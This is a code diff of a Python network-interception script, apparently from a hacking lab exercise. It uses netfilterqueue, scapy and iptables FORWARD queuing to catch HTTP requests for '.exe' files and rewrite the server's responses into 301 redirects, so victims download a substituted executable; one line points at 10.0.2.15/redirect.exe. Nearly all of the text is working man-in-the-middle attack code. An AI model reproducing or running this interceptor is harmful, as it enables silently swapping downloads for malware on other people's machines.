@@ -28,7 +28,9 @@ import netfilterqueue
 import scapy.all as scapy
 
 
-REDIRECT = b'https://referrals.brave.com/latest/BraveBrowserSetup.exe'
+# REDIRECT = b'https://referrals.brave.com/latest/BraveBrowserSetup.exe'
+REDIRECT = b'10.0.2.15/redirect.exe'
+
 
 ############################### Functions ############################### 
 def forward_packets():
@@ -43,11 +45,11 @@ def forward_packets():
     # -I -> insert (packet into a chain specified by the user)
     # -j -> jump if the packet matches the target.
     # --queue-num -> jump to specfic queue number
-    # call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
+    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
 
     # for local host
-    call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
-    call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
+    # call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
+    # call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
     
 
 
@@ -79,7 +81,7 @@ def process_packet(packet):
         if scapy_pkt[scapy.TCP].dport == 80:
             if b".exe" in scapy_pkt[scapy.Raw].load:
                 print('[*] EXE Request Detected!')
-                # ack_list.append(scapy_pkt[scapy.TCP].ack)
+                ack_list.append(scapy_pkt[scapy.TCP].ack)
 
             # if b".txt" in scapy_pkt[scapy.Raw].load:
             #     print('[*] TXT Request Detected!')
@@ -91,7 +93,7 @@ def process_packet(packet):
             if scapy_pkt[scapy.TCP].seq in ack_list:
                 print('[*] Replacing File!\n')
                 ack_list.remove(scapy_pkt[scapy.TCP].seq)
-                scapy_pkt[scapy.Raw].load = f"HTTP/1.1 301 Moved Permanently\nLocation: {REDIRECT}\n\n"
+                scapy_pkt[scapy.Raw].load = f"HTTP/1.1 301 Moved Permanently\nLocation: https://referrals.brave.com/latest/BraveBrowserSetup.exe \n\n"
 
                 # since now the packet has been tampered, the new 
                 # packet will have differet length and checksums
@@ -102,9 +104,8 @@ def process_packet(packet):
                 del scapy_pkt[scapy.TCP].chksum
                 packet.set_payload(bytes(scapy_pkt))
 
-                print(scapy_pkt.show())
-                print(packet)
-            print()
+                # print(scapy_pkt.show())
+                # print(packet)
         
 
     packet.accept()
